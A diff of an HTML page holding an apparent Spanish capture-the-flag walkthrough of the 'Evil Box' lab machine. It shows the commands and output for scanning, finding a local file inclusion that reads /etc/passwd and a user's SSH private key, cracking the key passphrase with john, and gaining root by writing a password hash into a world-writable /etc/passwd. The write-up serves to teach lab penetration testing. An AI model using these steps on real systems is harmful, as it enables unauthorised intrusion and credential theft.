@@ -1,4 +1,5 @@
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><link rel="icon" type="image/x-icon" href="assets/Evil%20Box;%20one%20line%20drawing.png" /><title>Evil Box</title><style>
+    
 /* cspell:disable-file */
 /* webkit printing magic: print all background colors */
 html {
@@ -666,12 +667,25 @@ blockquote {
 	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
 }
 	
-</style></head><body style="background-color: #E5E8E8"><article id="1fc226e5-194c-4b99-83ac-f1fb884d3ebe" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_lightgray.svg"/></div><h1 class="page-title">Evil Box</h1></header><div class="page-body"><h3 id="de576847-aee7-46c4-9ec4-3c6fed2ab108" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="7e939002-b44f-4a95-99e9-6f2d7df50e3c" class="">Empiezo haciendo un escaneo con nmap para ver puertos abiertos</p><pre id="c4edae4b-dbe0-46fa-9e52-8d1007628fd7" class="code"><code>❯ nmap 192.168.1.19
+</style></head><link href="css/prism.css" rel="stylesheet" /><body style="background-color: #E5E8E8"><style>
+            body {
+                background-image: url('/assets/gris.jpg');
+                background-repeat: no-repeat;
+                background-size: cover;
+                background-attachment: fixed
+                }
+        </style>
+        <style>
+               body {
+                    color: azure;
+                }
+        </style>
+    <article id="1fc226e5-194c-4b99-83ac-f1fb884d3ebe" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/met_winslow_homer_maine_coast.jpg" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="https://www.notion.so/icons/package_green.svg"/></div><h1 class="page-title">Evil Box</h1></header><div class="page-body"><h3 id="de576847-aee7-46c4-9ec4-3c6fed2ab108" class=""><mark class="highlight-blue">Intrusion</mark></h3><p id="7e939002-b44f-4a95-99e9-6f2d7df50e3c" class="">Empiezo haciendo un escaneo con nmap para ver puertos abiertos</p><pre id="c4edae4b-dbe0-46fa-9e52-8d1007628fd7" class="code"><code class="language-javascript">❯ nmap 192.168.1.19
 Nmap scan report for 192.168.1.19
 Host is up (0.0024s latency).
 PORT   STATE SERVICE
 22/tcp open  ssh
-80/tcp open  http</code></pre><figure id="25a4d453-d842-4cd1-84c5-b9d4a5b42056" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117182600.png"><img style="width:768px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117182600.png"/></a></figure><p id="d64d25c8-bdf6-4228-90c5-f97b613be203" class="">Uso nikto para ver posibles vulnerabilidades o recursos en la página</p><pre id="f09a7f44-66d5-46e8-971a-a0424b566ad1" class="code"><code>❯ nikto -h http://192.168.1.19/
+80/tcp open  http</code></pre><figure id="25a4d453-d842-4cd1-84c5-b9d4a5b42056" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117182600.png"><img style="width:768px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117182600.png"/></a></figure><p id="d64d25c8-bdf6-4228-90c5-f97b613be203" class="">Uso nikto para ver posibles vulnerabilidades o recursos en la página</p><pre id="f09a7f44-66d5-46e8-971a-a0424b566ad1" class="code"><code class="language-javascript">❯ nikto -h http://192.168.1.19/
 ---------------------------------------------------------------------------
 + Target IP:          192.168.1.19
 + Target Hostname:    192.168.1.19
@@ -684,7 +698,7 @@ PORT   STATE SERVICE
 + OSVDB-3233: /icons/README: Apache default file found.
 + End Time:           2023-01-17 18:12:00 (GMT-3) (22 seconds)
 ---------------------------------------------------------------------------</code></pre><p id="0c0bdf99-5b08-4c75-9e13-a3cbfe6651b7" class="">Me muestra un &quot;robots.txt&quot; un directorio &quot;<span style="border-bottom:0.05em solid">/secret/</span>&quot; y un &quot;<span style="border-bottom:0.05em solid">/icons/README</span>&quot;.</p><p id="54a996aa-87a4-4caf-9e74-395e775026b8" class="">Nada interesante en robots.txt y <span style="border-bottom:0.05em solid">/secret</span> por ahora</p><figure id="8c5c5103-1d59-4edc-acd8-c4c022bb30bb" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183648.png"><img style="width:432px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183648.png"/></a></figure><p id="09c24ea2-e055-42aa-a6b6-ec7bcdafbba0" class="">
-</p><figure id="840b8ec8-1b08-44ff-acff-7467d294107b" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183823.png"><img style="width:426px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183823.png"/></a></figure><p id="3aaeab68-b1ea-4c97-9a90-d37a42e1f838" class="">Después de hacer fuzzing de subdominios u otras rutas y no encontrar nada, busque por archivos php o txt en el directorio<span style="border-bottom:0.05em solid"> /secret/</span></p><pre id="faae654e-9c55-4919-b034-9791362b9952" class="code"><code>❯ gobuster dir -u http://192.168.1.19/secret/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x php,txt
+</p><figure id="840b8ec8-1b08-44ff-acff-7467d294107b" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183823.png"><img style="width:426px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117183823.png"/></a></figure><p id="3aaeab68-b1ea-4c97-9a90-d37a42e1f838" class="">Después de hacer fuzzing de subdominios u otras rutas y no encontrar nada, busque por archivos php o txt en el directorio<span style="border-bottom:0.05em solid"> /secret/</span></p><pre id="faae654e-9c55-4919-b034-9791362b9952" class="code"><code class="language-javascript">❯ gobuster dir -u http://192.168.1.19/secret/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x php,txt
 ===============================================================
 Gobuster v3.1.0
 ===============================================================
@@ -701,7 +715,7 @@ Gobuster v3.1.0
 
 ===============================================================
 2023/01/17 19:05:06 Finished
-===============================================================</code></pre><p id="cc2ba2e0-d428-4b01-86fd-8d3b9d3b0735" class="">El recurso <strong>evil.php</strong> existe pero en la web todavía no muestra nada</p><figure id="25e29b27-a44b-45a3-af3b-9b2c457142c4" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117190744.png"><img style="width:542px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117190744.png"/></a></figure><p id="d74e785a-389e-4545-9fc4-63e4d335295d" class="">Tiene pinta de ser un Local File Inclusion (LFI), por lo que lanzo otro escaneo para detectar algún parámetro web con el que pueda listar archivos locales de la maquina</p><pre id="05a39be0-13d8-4231-8680-0a0db5712f43" class="code"><code>❯ wfuzz -c --hc=404 --hw=0 -w /opt/SecLists/Miscellaneous/web/html-tags.txt &#x27;http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd&#x27; 2&gt;/dev/null
+===============================================================</code></pre><p id="cc2ba2e0-d428-4b01-86fd-8d3b9d3b0735" class="">El recurso <strong>evil.php</strong> existe pero en la web todavía no muestra nada</p><figure id="25e29b27-a44b-45a3-af3b-9b2c457142c4" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117190744.png"><img style="width:542px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117190744.png"/></a></figure><p id="d74e785a-389e-4545-9fc4-63e4d335295d" class="">Tiene pinta de ser un Local File Inclusion (LFI), por lo que lanzo otro escaneo para detectar algún parámetro web con el que pueda listar archivos locales de la maquina</p><pre id="05a39be0-13d8-4231-8680-0a0db5712f43" class="code"><code class="language-javascript">❯ wfuzz -c --hc=404 --hw=0 -w /opt/SecLists/Miscellaneous/web/html-tags.txt &#x27;http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd&#x27; 2&gt;/dev/null
 ********************************************************
 
 Target: http://192.168.1.19/secret/evil.php?FUZZ=/etc/passwd
@@ -716,7 +730,7 @@ ID           Response   Lines    Word       Chars       Payload
 Total time: 0
 Processed Requests: 153
 Filtered Requests: 152
-Requests/sec.: 0</code></pre><p id="eb01e9b3-fedf-48d1-b3b6-e448f29f40f8" class=""><em>command</em> parece ser el parámetro para intentar un LFI</p><figure id="17148ac0-1002-482f-a5f4-e2fcce5f8027" class="image"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117192626.png"><img style="width:1326px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117192626.png"/></a></figure><p id="fae34063-4953-4b10-8cf1-feade6d0ed46" class="">Funciona, por lo que ahora podemos probar ver la id_rsa de algún usuario del sistema</p><figure id="97017046-fdc6-4b38-93b7-2c44d30d841b" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117204123.png"><img style="width:816px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117204123.png"/></a></figure><p id="dd63b8cb-60c4-4907-97f3-46ff82938180" class="">Vemos la del usuario <mark class="highlight-teal"><em>mowree</em></mark> pero está encriptada.</p><p id="624b75f3-102a-41c6-b7e8-ef5434f01aa4" class="">Con ssh2john podemos tratar de sacar la contraseña.</p><pre id="16e9076b-e693-487d-973b-008228dc489a" class="code"><code>❯ /usr/share/john/ssh2john.py id_rsa &gt; hash</code></pre><pre id="248490a9-5d37-4e0c-bd04-cc6cf7579e2f" class="code"><code>❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Requests/sec.: 0</code></pre><p id="eb01e9b3-fedf-48d1-b3b6-e448f29f40f8" class=""><em>command</em> parece ser el parámetro para intentar un LFI</p><figure id="17148ac0-1002-482f-a5f4-e2fcce5f8027" class="image"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117192626.png"><img style="width:1326px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117192626.png"/></a></figure><p id="fae34063-4953-4b10-8cf1-feade6d0ed46" class="">Funciona, por lo que ahora podemos probar ver la id_rsa de algún usuario del sistema</p><figure id="97017046-fdc6-4b38-93b7-2c44d30d841b" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117204123.png"><img style="width:816px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230117204123.png"/></a></figure><p id="dd63b8cb-60c4-4907-97f3-46ff82938180" class="">Vemos la del usuario <mark class="highlight-teal"><em>mowree</em></mark> pero está encriptada.</p><p id="624b75f3-102a-41c6-b7e8-ef5434f01aa4" class="">Con ssh2john podemos tratar de sacar la contraseña.</p><pre id="16e9076b-e693-487d-973b-008228dc489a" class="code"><code class="language-javascript">❯ /usr/share/john/ssh2john.py id_rsa &gt; hash</code></pre><pre id="248490a9-5d37-4e0c-bd04-cc6cf7579e2f" class="code"><code class="language-javascript">❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
@@ -728,7 +742,7 @@ Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
 unicorn          (id_rsa)
 
 Session completed</code></pre><p id="242563a8-70c4-444c-b06a-1c9d05489d1c" class="">
-Tengo la contraseña de la id_rsa por lo que ahora puedo intentar conectarme por ssh ingresando la clave de la is_rsa pero sin poner la contraseña del usuario <mark class="highlight-teal"><em>mowree</em></mark></p><pre id="1149fb71-4f8f-4df7-9a32-ac3c462cfbb5" class="code"><code>❯ ssh mowree@192.168.1.19 -i id_rsa
+Tengo la contraseña de la id_rsa por lo que ahora puedo intentar conectarme por ssh ingresando la clave de la is_rsa pero sin poner la contraseña del usuario <mark class="highlight-teal"><em>mowree</em></mark></p><pre id="1149fb71-4f8f-4df7-9a32-ac3c462cfbb5" class="code"><code class="language-javascript">❯ ssh mowree@192.168.1.19 -i id_rsa
 Enter passphrase for key &#x27;id_rsa&#x27;: 
 Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
 mowree@EvilBoxOne:~$ whoami
@@ -736,10 +750,11 @@ mowree
 mowree@EvilBoxOne:~$</code></pre><p id="0842992f-d3c4-4ac4-8e3c-7dbcedfc1a0d" class="">
 </p><hr id="257613a4-30c6-435e-a63c-eea5bca45c54"/><p id="bd28ba22-86f6-4382-98ad-f1c48201341b" class="">
 </p><h3 id="8013cb40-2721-4cf7-bbfa-97827773e754" class=""><mark class="highlight-blue">Elevando Privilegios</mark></h3><p id="4046dc1b-21d6-46f4-997b-da68d71b6630" class="">
-</p><p id="fd1ff38c-3d98-4316-a7cb-01bca0633780" class="">Si listamos los permisos del archivo <span style="border-bottom:0.05em solid">/etc/passwd</span> vemos que otros pueden escribir</p><pre id="f5a5b90f-743f-4346-a181-879438d81e35" class="code"><code>mowree@EvilBoxOne:~$ ls -la /etc/passwd
--rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd</code></pre><p id="a8444a47-5cf4-45ab-9ee2-8ee5622d98aa" class="">Por lo que ahora podemos crear una contraseña para el usuario <mark class="highlight-red"><em>root</em></mark> y poner el hash en el <span style="border-bottom:0.05em solid">/etc/passwd</span></p><pre id="e4e5284f-58cb-443e-8ab3-99c77f74970e" class="code"><code>❯ openssl passwd -1
+</p><p id="fd1ff38c-3d98-4316-a7cb-01bca0633780" class="">Si listamos los permisos del archivo <span style="border-bottom:0.05em solid">/etc/passwd</span> vemos que otros pueden escribir</p><pre id="f5a5b90f-743f-4346-a181-879438d81e35" class="code"><code class="language-javascript">mowree@EvilBoxOne:~$ ls -la /etc/passwd
+-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd</code></pre><p id="a8444a47-5cf4-45ab-9ee2-8ee5622d98aa" class="">Por lo que ahora podemos crear una contraseña para el usuario <mark class="highlight-red"><em>root</em></mark> y poner el hash en el <span style="border-bottom:0.05em solid">/etc/passwd</span></p><pre id="e4e5284f-58cb-443e-8ab3-99c77f74970e" class="code"><code class="language-javascript">❯ openssl passwd -1
 Password: 
 Verifying - Password: 
 $1$eKwzP0P1$W4PsKYip9JqhXY2BAKMBe0</code></pre><p id="ebdb0ec0-3422-40c4-a4ce-b0e6a5d3d486" class="">Con openssl generamos el hash de la contraseña &quot;<mark class="highlight-yellow">password123</mark>” y lo cambiamos por la x en <span style="border-bottom:0.05em solid">/etc/passwd</span></p><figure id="89fc6bae-9bd3-4606-9725-72c67a9fb8b3" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010249.png"><img style="width:672px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010249.png"/></a></figure><figure id="87046c54-e2d5-4194-9216-598d8351f35f" class="image" style="text-align:left"><a href="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010342.png"><img style="width:340px" src="Evil%20Box%201fc226e5194c4b9983acf1fb884d3ebe/Pasted_image_20230118010342.png"/></a></figure><p id="37acd7cf-6680-42b8-a146-f2202d785051" class="">
 </p><p id="86377325-55df-480b-9dd6-fbb1baf8f0e3" class="">
-</p></div></article></body></html>
+</p></div></article></body><script src="ruta-a-tu-archivo/prism.js"></script>
+</html>
